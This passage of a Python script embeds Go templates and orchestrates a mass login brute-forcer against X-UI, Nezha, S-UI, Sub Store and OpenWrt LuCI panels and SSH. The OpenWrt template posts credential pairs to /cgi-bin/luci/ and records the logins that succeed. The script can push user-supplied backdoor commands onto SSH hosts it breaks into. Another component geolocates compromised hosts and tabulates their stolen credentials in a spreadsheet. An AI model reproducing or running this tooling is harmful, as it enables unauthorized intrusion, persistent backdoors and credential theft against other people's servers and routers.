	startTime = time.Now()
	completedCount = 0
	lastCompletedCount = 0
	lastUpdateTime = time.Now()
	retryFlag = false  // 清除重试标志

	go updateProgress()

	outputFile := "xui.txt"
	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("无法打开输出文件:", err)
		return
	}
	defer file.Close()

		for i := 0; i < len(batch); i += batchSize {
		end := i + batchSize
		if end > len(batch) {
			end = len(batch)
		}
		currentBatch := batch[i:end]

		for _, ipPort := range currentBatch {
			processIP(ipPort, file, usernames, passwords)
		}

		// 用带超时的 WaitGroup，防止死等
		if !waitTimeout(&wg, 120*time.Second) {
			fmt.Println("\\n等待任务超时，主动触发重试！")
			triggerFileCleanUp()
			break // 跳出批次，进入 retryFlag 检查
		}
		time.Sleep(100 * time.Millisecond)
		triggerGC()
	}
	if retryFlag {
		fmt.Println("⚠️ 重新爆破启动...")
		goto RETRY
	}

	time.Sleep(1 * time.Second)
	fmt.Println("\\n全部处理完成！")
}


'''
# =========================== xui.go模板7内容 ===========================
XUI_GO_TEMPLATE_7 = '''package main

import (
	"context"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
	"runtime"
)

var wg sync.WaitGroup
var semaphore = make(chan struct{}, {semaphore_size})
var completedCount int64
var totalTasks int64
var startTime time.Time

const (
	timeoutSeconds = 5
	successFlag    = `{"status":"success","data"`
)

var headers = map[string]string{
	"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
	"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"Accept-Encoding": "gzip, deflate, br",
}

func loadInputFile(inputFile string) []string {
	content, err := ioutil.ReadFile(inputFile)
	if err != nil {
		fmt.Println("无法读取输入文件:", err)
		os.Exit(1)
	}
	lines := strings.Split(string(content), "\\n")
	var cleaned []string
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" {
			cleaned = append(cleaned, line)
		}
	}
	return cleaned
}

func writeResultToFile(file *os.File, text string) {
	file.WriteString(text + "\\n")
}

func sendRequest(ctx context.Context, client *http.Client, fullURL string) bool {
	req, err := http.NewRequestWithContext(ctx, "GET", fullURL, nil)
	if err != nil {
		return false
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}

	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		bodyBytes, _ := io.ReadAll(resp.Body)
		if strings.Contains(string(bodyBytes), successFlag) {
			return true
		}
	}
	return false
}

func tryBothProtocols(ipPort string, path string, client *http.Client, file *os.File) bool {
	cleanPath := strings.Trim(path, "/")
	fullPath := cleanPath + "/api/utils/env"
	httpProbeURL := fmt.Sprintf("http://%s/%s", ipPort, fullPath)
	httpsProbeURL := fmt.Sprintf("https://%s/%s", ipPort, fullPath)

	ctx1, cancel1 := context.WithTimeout(context.Background(), timeoutSeconds*time.Second)
	defer cancel1()
	if sendRequest(ctx1, client, httpProbeURL) {
		output := fmt.Sprintf("http://%s?api=http://%s/%s", ipPort, ipPort, cleanPath)
		writeResultToFile(file, output)
		return true
	}

	ctx2, cancel2 := context.WithTimeout(context.Background(), timeoutSeconds*time.Second)
	defer cancel2()
	if sendRequest(ctx2, client, httpsProbeURL) {
		output := fmt.Sprintf("https://%s?api=https://%s/%s", ipPort, ipPort, cleanPath)
		writeResultToFile(file, output)
		return true
	}

	return false
}


func processIP(ipPort string, file *os.File, paths []string, client *http.Client) {
	defer wg.Done()
	semaphore <- struct{}{}
	defer func() { <-semaphore }()

	for _, path := range paths {
		if tryBothProtocols(ipPort, path, client, file) {
			break
		}
	}
	atomic.AddInt64(&completedCount, 1)
}

func updateProgress() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		count := atomic.LoadInt64(&completedCount)
		percent := float64(count) / float64(totalTasks) * 100
		elapsed := int(time.Since(startTime).Seconds())

		if count == 0 {
			fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
			continue
		}
		remaining := int(float64(elapsed)/float64(count)*(float64(totalTasks)-float64(count)))
		fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)

		if count >= totalTasks {
			break
		}
	}
}

func triggerGC() {
	runtime.GC()
}

func main() {
	inputFile := "results.txt"
	outputFile := "xui.txt"
	batchSize := {batch_size}
	passwords := {pass_list}
	paths := passwords

	lines := loadInputFile(inputFile)

	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("无法打开输出文件:", err)
		return
	}
	defer file.Close()

	totalTasks = int64(len(lines))
	startTime = time.Now()
	go updateProgress()

	client := &http.Client{Timeout: timeoutSeconds * time.Second}

	for i := 0; i < len(lines); i += batchSize {
		end := i + batchSize
		if end > len(lines) {
			end = len(lines)
		}
		currentBatch := lines[i:end]

		for _, ipPort := range currentBatch {
			wg.Add(1)
			go processIP(ipPort, file, paths, client)
		}

		wg.Wait()
		time.Sleep(100 * time.Millisecond)
		triggerGC()
	}

	time.Sleep(1 * time.Second)
	fmt.Println("\\n全部处理完成！")
}
'''
# =========================== xui.go模板8内容 ===========================
XUI_GO_TEMPLATE_8 = '''package main

import (
	"context"
	"net/url"
	
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
	"runtime"
)

var wg sync.WaitGroup
var semaphore = make(chan struct{}, {semaphore_size})
var completedCount int64
var totalTasks int64
var startTime time.Time

var client = &http.Client{
    Timeout: 3 * time.Second,
    CheckRedirect: func(req *http.Request, via []*http.Request) error {
        return http.ErrUseLastResponse
    },
}

func loadList(filename string) []string {
	content, err := ioutil.ReadFile(filename)
	if err != nil {
		fmt.Println("无法读取", filename, ":", err)
		os.Exit(1)
	}
	lines := strings.Split(string(content), "\\n")
	var result []string
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" {
			result = append(result, line)
		}
	}
	return result
}

// post请求,支持自动切换 http/https
func postRequest(ctx context.Context, urlStr string, username string, password string, origin string, referer string) (*http.Response, error) {
	payload := fmt.Sprintf("luci_username=%s&luci_password=%s", username, password)
	formData := strings.NewReader(payload)
	req, err := http.NewRequest("POST", urlStr, formData)
	if err != nil {
		return nil, err
	}
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0")
	req.Header.Set("Referer", referer)
	req.Header.Set("Origin", origin)
	req = req.WithContext(ctx)
	return client.Do(req)
}


// 结果写文件
func writeResultToFile(file *os.File, text string) {
	file.WriteString(text)
	file.Sync()
}

func processIP(line string, file *os.File, usernames []string, passwords []string) {
	defer wg.Done()
	semaphore <- struct{}{}
	defer func() { <-semaphore }()

	targets := []string{}

	trimmed := strings.TrimSpace(line)
	if trimmed == "" {
		atomic.AddInt64(&completedCount, 1)
		return
	}

	// 如果是 http(s):// 开头，直接用
	if strings.HasPrefix(trimmed, "http://") || strings.HasPrefix(trimmed, "https://") {
		targets = append(targets, trimmed)
	} else {
		// 否则按 IP 或 IP:端口 处理
		parts := strings.Split(trimmed, ":")
		ip := parts[0]
		var ports []string
		if len(parts) == 1 {
			ports = []string{"80", "443"}
		} else if len(parts) == 2 {
			ports = []string{parts[1]}
		} else {
			atomic.AddInt64(&completedCount, 1)
			return
		}
		for _, port := range ports {
			targets = append(targets,
				fmt.Sprintf("http://%s:%s/cgi-bin/luci/", ip, port),
				fmt.Sprintf("https://%s:%s/cgi-bin/luci/", ip, port),
			)
		}
	}

loginLoop:
	for _, target := range targets {
		// 补 "/cgi-bin/luci/" 路径，如果目标已经带了，直接用原样
		finalURL := target
		if !(strings.Contains(target, "/cgi-bin/luci")) {
			if strings.HasSuffix(target, "/") {
				finalURL = target + "cgi-bin/luci/"
			} else {
				finalURL = target + "/cgi-bin/luci/"
			}
		}
		// 自动补 referer/origin
		u, _ := url.Parse(finalURL)
		origin := u.Scheme + "://" + u.Host
		referer := origin + "/"

		for _, username := range usernames {
			for _, password := range passwords {
				ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
				resp, err := postRequest(ctx, finalURL, username, password, origin, referer)
				cancel()
				if err != nil {
					continue
				}
				cookies := resp.Cookies()
				for _, c := range cookies {
					if c.Name == "sysauth_http" && c.Value != "" {
						fmt.Printf("[+] 爆破成功: %s %s %s\\n", finalURL, username, password)
						writeResultToFile(file, fmt.Sprintf("%s %s %s\\n", finalURL, username, password))
						atomic.AddInt64(&completedCount, 1)
						resp.Body.Close()
						break loginLoop
					}
				}
				resp.Body.Close()
			}
		}
	}
	atomic.AddInt64(&completedCount, 1)
}

func updateProgress() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	for range ticker.C {
		count := atomic.LoadInt64(&completedCount)
		percent := float64(count) / float64(totalTasks) * 100
		elapsed := int(time.Since(startTime).Seconds())
		if count == 0 {
			fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
			continue
		}
		remaining := int(float64(elapsed)/float64(count)*(float64(totalTasks)-float64(count)))
		fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)
		if count >= totalTasks {
			break
		}
	}
}

func triggerGC() {
	runtime.GC()
}

func main() {
	inputFile := "results.txt"
	lines, err := ioutil.ReadFile(inputFile)
	if err != nil {
		fmt.Println("无法读取输入文件:", err)
		return
	}
	
	usernames := {user_list}
     passwords := {pass_list}



	outputFile := "xui.txt"
	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("无法打开输出文件:", err)
		return
	}
	defer file.Close()

	batchSize := {batch_size}
	var batch []string

	allLines := strings.Split(string(lines), "\\n")
	for _, line := range allLines {
		line = strings.TrimSpace(line)
		if line != "" {
			batch = append(batch, line)
		}
	}

	totalTasks = int64(len(batch))
	startTime = time.Now()
	go updateProgress()

	for i := 0; i < len(batch); i += batchSize {
		end := i + batchSize
		if end > len(batch) {
			end = len(batch)
		}
		currentBatch := batch[i:end]
		for _, ipPort := range currentBatch {
			wg.Add(1)
			go processIP(ipPort, file, usernames, passwords)
		}
		wg.Wait()
		time.Sleep(100 * time.Millisecond)
		triggerGC()
	}

	time.Sleep(1 * time.Second)
	fmt.Println("\\n全部处理完成！")
}

'''
# =========================== ipcx.py 内容 ===========================
IPCX_PY_CONTENT = """import requests
import time
import os
import re
from openpyxl import Workbook, load_workbook
from openpyxl.utils import get_column_letter

def extract_host_port(line):
    match = re.search(r'https?://([^/\s]+)', line)
    if match:
        return match.group(1)
    else:
        return line.strip()

def get_ip_info(ip_port, retries=3):
    if ':' in ip_port:
        ip, port = ip_port.split(':', 1)
    else:
        ip = ip_port.strip()
        port = ''
    url = f"http://ip-api.com/json/{ip}?fields=country,regionName,city,isp"
    for attempt in range(retries):
        try:
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                ip_info = response.json()
                country = ip_info.get('country', 'N/A')
                region = ip_info.get('regionName', 'N/A')
                city = ip_info.get('city', 'N/A')
                isp = ip_info.get('isp', 'N/A')
                return [f"{ip}:{port}" if port else ip, country, region, city, isp]
        except requests.exceptions.RequestException:
            if attempt < retries - 1:
                time.sleep(1)
            else:
                return [f"{ip}:{port}" if port else ip, 'N/A', 'N/A', 'N/A', 'N/A']
    return [f"{ip}:{port}" if port else ip, 'N/A', 'N/A', 'N/A', 'N/A']

def format_time(seconds):
    minutes = int(seconds) // 60
    seconds = int(seconds) % 60
    return f"{minutes}分钟{seconds}秒"

def adjust_column_width(ws):
    for col in ws.columns:
        max_length = 0
        column = col[0].column
        column_letter = get_column_letter(column)
        for cell in col:
            try:
                if cell.value:
                    length = len(str(cell.value))
                    if length > max_length:
                        max_length = length
            except:
                pass
        adjusted_width = max_length + 2
        ws.column_dimensions[column_letter].width = adjusted_width



def extract_ip_port(url):
    match = re.search(r'https?://([^/\s]+)', url)
    if match:
        return match.group(1)
    
    if ':' in url:
        
        return url.split()[0]
   
    return url.split()[0]

def process_ip_port_file(input_file, output_excel):
    with open(input_file, 'r', encoding='utf-8') as f:
        lines = [line.strip() for line in f if line.strip()]
    total_tasks = len(lines)
    completed_tasks = 0
    start_time = time.time()

    headers = ['原始地址', 'IP/域名:端口', '用户名', '密码', '国家', '地区', '城市', 'ISP']

    if os.path.exists(output_excel):
        os.remove(output_excel)

    wb = Workbook()
    ws = wb.active
    ws.title = "IP信息"
    ws.append(headers)
    wb.save(output_excel)

    for line in lines:
        # 按空格分割: 支持格式1/2/3/4
        parts = line.split()
        if len(parts) >= 3:
            addr, user, passwd = parts[:3]
        else:
            addr = parts[0]
            user = passwd = ''

        ip_port = extract_ip_port(addr)
        ip_info = get_ip_info(ip_port)
        row = [addr, ip_port, user, passwd] + ip_info[1:]

        wb = load_workbook(output_excel)
        ws = wb.active
        ws.append(row)
        adjust_column_width(ws)
        wb.save(output_excel)

        completed_tasks += 1
        elapsed_time = time.time() - start_time
        avg_time_per_task = elapsed_time / completed_tasks
        remaining_tasks = total_tasks - completed_tasks
        estimated_remaining_time = avg_time_per_task * remaining_tasks

        percent = (completed_tasks / total_tasks) * 100
        eta = format_time(estimated_remaining_time)
        print(f"\\r处理进度: {completed_tasks}/{total_tasks} ({percent:.2f}%) 预计剩余时间: {eta}", end='', flush=True)
        time.sleep(1.5)
    print("\\n全部处理完成！")


if __name__ == "__main__":
    process_ip_port_file('xui.txt', 'xui.xlsx')

"""

# =========================== 主脚本部分 ===========================

def input_with_default(prompt, default):
    user_input = input(f"{prompt}（默认 {default}）：").strip()
    return int(user_input) if user_input.isdigit() else default

def input_filename_with_default(prompt, default):
    user_input = input(f"{prompt}（默认 {default}）：").strip()
    return user_input if user_input else default

def generate_xui_go(semaphore_size, batch_size, usernames, passwords):
    user_list = "[]string{" + ", ".join([f'"{u}"' for u in usernames]) + "}"
    pass_list = "[]string{" + ", ".join([f'"{p}"' for p in passwords]) + "}"
    code = XUI_GO_TEMPLATE_1.replace("{semaphore_size}", str(semaphore_size)) \
                            .replace("{batch_size}", str(batch_size)) \
                            .replace("{user_list}", user_list) \
                            .replace("{pass_list}", pass_list)
    with open('xui.go', 'w', encoding='utf-8') as f:
        f.write(code)
def generate_xui_go_template2(semaphore_size, batch_size, usernames, passwords):
    user_list = "[]string{" + ", ".join([f'"{u}"' for u in usernames]) + "}"
    pass_list = "[]string{" + ", ".join([f'"{p}"' for p in passwords]) + "}"
    code = XUI_GO_TEMPLATE_2.replace("{semaphore_size}", str(semaphore_size)) \
                            .replace("{batch_size}", str(batch_size)) \
                            .replace("{user_list}", user_list) \
                            .replace("{pass_list}", pass_list)
    with open('xui.go', 'w', encoding='utf-8') as f:
        f.write(code)
def generate_xui_go_template3(semaphore_size, batch_size, usernames, passwords):
    user_list = "[]string{" + ", ".join([f'"{u}"' for u in usernames]) + "}"
    pass_list = "[]string{" + ", ".join([f'"{p}"' for p in passwords]) + "}"
    code = XUI_GO_TEMPLATE_3.replace("{semaphore_size}", str(semaphore_size)) \
                            .replace("{batch_size}", str(batch_size)) \
                            .replace("{user_list}", user_list) \
                            .replace("{pass_list}", pass_list)
    with open('xui.go', 'w', encoding='utf-8') as f:
        f.write(code)
def generate_xui_go_template4(semaphore_size, batch_size, usernames, passwords):
    user_list = "[]string{" + ", ".join([f'"{u}"' for u in usernames]) + "}"
    pass_list = "[]string{" + ", ".join([f'"{p}"' for p in passwords]) + "}"
    code = XUI_GO_TEMPLATE_4.replace("{semaphore_size}", str(semaphore_size)) \
                            .replace("{batch_size}", str(batch_size)) \
                            .replace("{user_list}", user_list) \
                            .replace("{pass_list}", pass_list)
    with open('xui.go', 'w', encoding='utf-8') as f:
        f.write(code)
def generate_xui_go_template5(semaphore_size, batch_size, usernames, passwords):
    user_list = "[]string{" + ", ".join([f'"{u}"' for u in usernames]) + "}"
    pass_list = "[]string{" + ", ".join([f'"{p}"' for p in passwords]) + "}"
    code = XUI_GO_TEMPLATE_5.replace("{semaphore_size}", str(semaphore_size)) \
                            .replace("{batch_size}", str(batch_size)) \
                            .replace("{user_list}", user_list) \
                            .replace("{pass_list}", pass_list)
    with open('xui.go', 'w', encoding='utf-8') as f:
        f.write(code)
def to_go_bool(val: bool) -> str:
    return "true" if val else "false"

def escape_go_string(s: str) -> str:
    return s.replace("\\", "\\\\").replace('"', '\\"')  # 只保留必要转义

def to_go_string_array_one_line(lines: list) -> str:
    if not lines:
        return "[]string{}"
    return "[]string{" + ", ".join([f'"{escape_go_string(line)}"' for line in lines]) + "}"


def generate_xui_go_template6(semaphore_size, batch_size, usernames, passwords, install_backdoor, custom_cmds):
    user_list = "[]string{" + ", ".join([f'"{u}"' for u in usernames]) + "}"
    pass_list = "[]string{" + ", ".join([f'"{p}"' for p in passwords]) + "}"

    backdoor_flag = to_go_bool(install_backdoor)
    cmd_array = to_go_string_array_one_line(custom_cmds)


    code = XUI_GO_TEMPLATE_6.replace("{semaphore_size}", str(semaphore_size)) \
                            .replace("{batch_size}", str(batch_size)) \
                            .replace("{user_list}", user_list) \
                            .replace("{pass_list}", pass_list) \
                            .replace("{enable_backdoor}", backdoor_flag) \
                            .replace("{custom_backdoor_cmds}", cmd_array)

    with open('xui.go', 'w', encoding='utf-8') as f:
        f.write(code)

def generate_xui_go_template7(semaphore_size, batch_size, usernames, passwords):
    user_list = "[]string{" + ", ".join([f'"{u}"' for u in usernames]) + "}"
    pass_list = "[]string{" + ", ".join([f'"{p}"' for p in passwords]) + "}"
    code = XUI_GO_TEMPLATE_7.replace("{semaphore_size}", str(semaphore_size)) \
                            .replace("{batch_size}", str(batch_size)) \
                            .replace("{user_list}", user_list) \
                            .replace("{pass_list}", pass_list)
    with open('xui.go', 'w', encoding='utf-8') as f:
        f.write(code)
def generate_xui_go_template8(semaphore_size, batch_size, usernames, passwords):
    user_list = "[]string{" + ", ".join([f'"{u}"' for u in usernames]) + "}"
    pass_list = "[]string{" + ", ".join([f'"{p}"' for p in passwords]) + "}"
    code = XUI_GO_TEMPLATE_8.replace("{semaphore_size}", str(semaphore_size)) \
                            .replace("{batch_size}", str(batch_size)) \
                            .replace("{user_list}", user_list) \
                            .replace("{pass_list}", pass_list)
    with open('xui.go', 'w', encoding='utf-8') as f:
        f.write(code)

def generate_ipcx_py():
    with open('ipcx.py', 'w', encoding='utf-8') as f:
        f.write(IPCX_PY_CONTENT)

def split_file(input_file, lines_per_file):
    with open(input_file, 'r', encoding='utf-8') as f:
        lines = f.readlines()
    for idx, start in enumerate(range(0, len(lines), lines_per_file), 1):
        with open(os.path.join(TEMP_PART_DIR, f"part_{idx}.txt"), 'w', encoding='utf-8') as fout:
            fout.writelines(lines[start:start + lines_per_file])


def run_xui_for_parts(sleep_seconds):
    part_files = sorted([f for f in os.listdir(TEMP_PART_DIR) if f.startswith('part_') and f.endswith('.txt')])
    total_parts = len(part_files)
    start_time = time.time()

    for idx, part in enumerate(part_files, 1):
        elapsed = time.time() - start_time
        avg_time_per_part = elapsed / idx
        remaining_parts = total_parts - idx
        est_remaining_time = avg_time_per_part * remaining_parts
        est_min = int(est_remaining_time) // 60
        est_sec = int(est_remaining_time) % 60

        print(f"爆破 {part} ({idx}/{total_parts}) 预计剩余时间: {est_min} 分 {est_sec} 秒")

        # 写入当前 part 内容到 results.txt
        shutil.copy(os.path.join(TEMP_PART_DIR, part), 'results.txt')

        # 运行 xui.go，完成才返回
        try:
            subprocess.run(['go', 'run', 'xui.go'], check=True)
        except subprocess.CalledProcessError:
            print("go运行失败，请检查环境")
            sys.exit(1)

        # Go 脚本运行完成后判断 xui.txt 是否存在
        output_file = os.path.join(TEMP_XUI_DIR, f'xui{idx}.txt')
        if os.path.exists('xui.txt'):
            shutil.move('xui.txt', output_file)
        else:
            print(f"第 {idx} 批无爆破成功结果（未生成 xui.txt）")
                # ===== 新增：移动 hmsuccessX.txt / hmfailX.txt 到临时目录 =====
               # 处理 SSH 后门成功与失败输出
        if os.path.exists("hmsuccess.txt"):
            shutil.move("hmsuccess.txt", os.path.join(TEMP_HMSUCCESS_DIR, f"hmsuccess{idx}.txt"))
        if os.path.exists("hmfail.txt"):
            shutil.move("hmfail.txt", os.path.join(TEMP_HMFAIL_DIR, f"hmfail{idx}.txt"))


        time.sleep(sleep_seconds)



def merge_xui_files():
    merged_file = os.path.join(TEMP_XUI_DIR, 'xui.txt')
    if os.path.exists(merged_file):
        os.remove(merged_file)

    with open(merged_file, 'w', encoding='utf-8') as outfile:
        for f in sorted(os.listdir(TEMP_XUI_DIR)):
            if f.startswith("xui") and f.endswith(".txt") and f != "xui.txt":
                with open(os.path.join(TEMP_XUI_DIR, f), 'r', encoding='utf-8') as infile:
                    shutil.copyfileobj(infile, outfile)

    # 最终结果复制一份供 ipcx 用
    shutil.copy(merged_file, 'xui.txt')
def merge_result_files(prefix: str, output_name: str, target_dir: str):
    output_path = os.path.join(target_dir, output_name)
    if os.path.exists(output_path):
        os.remove(output_path)
    with open(output_path, "w", encoding="utf-8") as out:
        for name in sorted(os.listdir(target_dir)):
            if name.startswith(prefix) and name.endswith(".txt"):
                with open(os.path.join(target_dir, name), "r", encoding="utf-8") as f:
                    shutil.copyfileobj(f, out)
    shutil.copy(output_path, output_name)


def run_ipcx():
    subprocess.run([sys.executable, 'ipcx.py'])

def clean_temp_files():
    shutil.rmtree(TEMP_PART_DIR, ignore_errors=True)
    shutil.rmtree(TEMP_XUI_DIR, ignore_errors=True)
    shutil.rmtree(TEMP_HMSUCCESS_DIR, ignore_errors=True)
    shutil.rmtree(TEMP_HMFAIL_DIR, ignore_errors=True)

    for f in ['results.txt', 'xui.go', 'ipcx.py', 'xui.txt']:
        if os.path.exists(f):
            os.remove(f)


    
    # 保留所有 xlsx 文件，不做删除


# =========================== 模板+模式选择逻辑 ===========================

def choose_template_mode():
    print("请选择爆破模式：")
    print("1.XUI面板爆破  2.哪吒面板爆破")
    print("3.HUI面板爆破  4.咸蛋面板爆破")
    print("5.SUI面板爆破  6.SSH爆破")
    print("7.Sub Store爆破  8.OpenWrt/iStoreOS爆破")
    while True:
        choice = input("输入 1、2、3、4、5、6、7 或 8（默认1）：").strip()
        if choice in ("", "1"):
            return 1
        elif choice == "2":
            return 2
        elif choice == "3":
            return 3
        elif choice == "4":
            return 4 
        elif choice == "5":
            return 5  
        elif choice == "6":
            return 6
        elif choice == "7":
            return 7  
        elif choice == "8":
            return 8                                 
        else:
            print("输入无效，请重新输入。")


# 用户选择爆破模式（全局变量）
TEMPLATE_MODE = choose_template_mode()

TEMP_PART_DIR = "temp_parts"
TEMP_XUI_DIR = "xui_outputs"
TEMP_HMSUCCESS_DIR = "temp_hmsuccess"
TEMP_HMFAIL_DIR = "temp_hmfail"

os.makedirs(TEMP_PART_DIR, exist_ok=True)
os.makedirs(TEMP_XUI_DIR, exist_ok=True)
os.makedirs(TEMP_HMSUCCESS_DIR, exist_ok=True)
os.makedirs(TEMP_HMFAIL_DIR, exist_ok=True)

# ========== SSH模式下是否自动安装后门及命令库处理 ==========
INSTALL_BACKDOOR = False
CUSTOM_BACKDOOR_CMDS = []

if TEMPLATE_MODE == 6:
    choice = input("是否在SSH爆破成功后自动安装后门，后门命令需存放在（后门命令.txt）？(y/N)：").strip().lower()
    if choice == 'y':
        INSTALL_BACKDOOR = True
        if not os.path.exists("后门命令.txt"):
            print("❌ 你选择了安装后门，但未找到 后门命令.txt，已中止爆破。")
            sys.exit(1)
        with open("后门命令.txt", encoding='utf-8') as f:
            CUSTOM_BACKDOOR_CMDS = [line.strip().replace('"', '\\"') for line in f if line.strip()]

# ========== 格式化为 Go 代码中的语法 ==========
enable_backdoor_go = "true" if INSTALL_BACKDOOR else "false"

if CUSTOM_BACKDOOR_CMDS:
    cmds_go = '[]string{' + ', '.join([f'"{cmd}"' for cmd in CUSTOM_BACKDOOR_CMDS]) + '}'
else:
    cmds_go = '[]string{}'




def check_environment():
    import importlib.util
    import subprocess
    import sys
    import shutil
    import os
    import re
    import platform
    
    # 如果是 Windows，跳过环境检测
    if platform.system().lower() == "windows":
        print(">>> 检测到 Windows 系统，跳过环境检测和依赖安装...\n")
        return
    
    print(">>> 正在检测网络位置...\n")

    def is_china_by_ping_ttl_delay_only():
        system = platform.system()
        cmd = ["ping", "-n", "1", "-w", "1000", "www.google.com"] if system == "Windows" \
            else ["ping", "-c", "1", "-W", "1", "www.google.com"]
        try:
            output = subprocess.check_output(cmd, stderr=subprocess.DEVNULL).decode()
            ttl_match = re.search(r"ttl[=|=](\d+)", output)
            time_match = re.search(r"time[=|=]([\d\.]+)", output)
            ttl = int(ttl_match.group(1)) if ttl_match else 0
            delay = float(time_match.group(1)) if time_match else 999
            return ttl <= 64 and delay < 20
        except:
            return True

    IN_CHINA = is_china_by_ping_ttl_delay_only()
    print(f">>> 网络环境判断结果：{'中国大陆（使用国内镜像）' if IN_CHINA else '非中国大陆（使用官方源）'}\n")

    os.environ["GOPROXY"] = "https://goproxy.cn,direct" if IN_CHINA else "https://proxy.golang.org,direct"
    os.environ["GOSUMDB"] = "sum.golang.google.cn" if IN_CHINA else "sum.golang.org"

    def run_cmd(cmd, check=True, shell=False):
        try:
            subprocess.run(cmd, check=check, shell=shell, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except subprocess.CalledProcessError as e:
            if check:
                raise e

    def apply_china_apt_source():
        if not os.path.exists("/etc/apt/sources.list"):
            return
        with open("/etc/apt/sources.list", "r") as f:
            content = f.read()
        if "mirrors.aliyun.com" in content:
            print(">>> 已使用国内 apt 源，跳过源替换")
            return
        print(">>> 正在切换为阿里云 apt 源...")
        try:
            shutil.copy("/etc/apt/sources.list", "/etc/apt/sources.list.bak")
            with open("/etc/apt/sources.list", "w") as f:
                f.write("""deb http://mirrors.aliyun.com/debian stable main contrib non-free
deb http://mirrors.aliyun.com/debian stable-updates main contrib non-free
deb http://mirrors.aliyun.com/debian-security stable-security main contrib non-free
""")
            run_cmd(["apt", "update", "-y"])
            print("✅ 已成功切换为阿里 apt 源")
        except Exception as e:
            print(f"❌ 切换 apt 源失败: {e}")

    if IN_CHINA:
        apply_china_apt_source()

    APT_UPDATED = False

    def ensure_cmd_exists(cmd, install_cmd):
        nonlocal APT_UPDATED
        if shutil.which(cmd) is None:
            print(f"⚠️ {cmd} 未安装，准备通过 apt 安装...")
            try:
                if not APT_UPDATED:
                    run_cmd(["apt", "update", "-y"])
                    APT_UPDATED = True
                run_cmd(install_cmd)
                print(f"✅ {cmd} 安装成功")
            except:
                print(f"❌ 安装 {cmd} 失败，请手动安装后重试！")
                sys.exit(1)
        else:
            print(f"✅ {cmd} 已存在，跳过安装")

    def ensure_pip():
        ensure_cmd_exists("pip3", ["apt", "install", "-y", "python3-pip"])

    def ensure_module(module_name):
        if importlib.util.find_spec(module_name) is None:
            print(f"⚠️ 模块 {module_name} 未安装，准备安装...")
            cmd = ["pip3", "install", module_name, "--break-system-packages"]
            if IN_CHINA:
                cmd += ["-i", "https://pypi.tuna.tsinghua.edu.cn/simple"]
            try:
                subprocess.run(cmd, check=True)
                print(f"✅ 模块 {module_name} 安装成功")
            except:
                print(f"❌ 安装模块 {module_name} 失败，请手动安装！")
                sys.exit(1)
        else:
            print(f"✅ 模块 {module_name} 已安装")

    def get_go_version():
        go_exec = "/usr/local/go/bin/go"
        if not os.path.exists(go_exec):
            return None
        try:
            out = subprocess.check_output([go_exec, "version"], stderr=subprocess.DEVNULL).decode()
            m = re.search(r"go(\d+)\.(\d+)", out)
            return (int(m.group(1)), int(m.group(2))) if m else None
        except:
            return None

    def ensure_go():
        version = get_go_version()
        if version and version >= (1, 20):
            print(f"✅ Go {version[0]}.{version[1]} 已安装")
            os.environ["PATH"] = "/usr/local/go/bin:" + os.environ["PATH"]
            return

        print("⚠️ Go 未安装或版本过低，准备安装 Go 1.22.1 ...")
        ensure_cmd_exists("curl", ["apt", "install", "-y", "curl"])

        url = "https://studygolang.com/dl/golang/go1.22.1.linux-amd64.tar.gz" if IN_CHINA \
            else "https://go.dev/dl/go1.22.1.linux-amd64.tar.gz"
        try:
            run_cmd(f"curl -Lo /tmp/go.tar.gz {url}", shell=True)
            run_cmd("rm -rf /usr/local/go", shell=True)
            run_cmd("tar -C /usr/local -xzf /tmp/go.tar.gz", shell=True)
        except:
            print("❌ 下载或解压 Go 安装包失败，请检查网络或Go镜像源")
            sys.exit(1)

        export_line = 'export PATH="/usr/local/go/bin:$PATH"'
        profile_path = "/etc/profile"
        with open(profile_path, "r") as f:
            if export_line not in f.read():
                with open(profile_path, "a") as f2:
                    f2.write(f"\n{export_line}\n")
                print(f"✅ PATH 写入 {profile_path} 完成（系统级永久生效）")
            else:
                print(f"✅ {profile_path} 中已存在 PATH 设置，跳过写入")

        os.environ["PATH"] = "/usr/local/go/bin:" + os.environ["PATH"]
        print("✅ Go 安装完成并配置 PATH（当前脚本已生效）")
        print("❌ 其他脚本如需使用 Go，请手动执行：source /etc/profile")

    def ensure_go_package(pkg):
        go_exec = "/usr/local/go/bin/go"
        print(f"检查 Go 包 {pkg} ...")
        try:
            subprocess.check_output([go_exec, "list", "-m", pkg], stderr=subprocess.DEVNULL)
            print(f"✅ Go 模块 {pkg} 已存在")
            return
        except:
            pass

        if not os.path.exists("go.mod"):
            subprocess.run([go_exec, "mod", "init", "xui"], check=True)

        try:
            subprocess.run([go_exec, "get", pkg], check=True, env=os.environ.copy())
            print(f"✅ 成功安装 Go 模块 {pkg}")
        except subprocess.CalledProcessError:
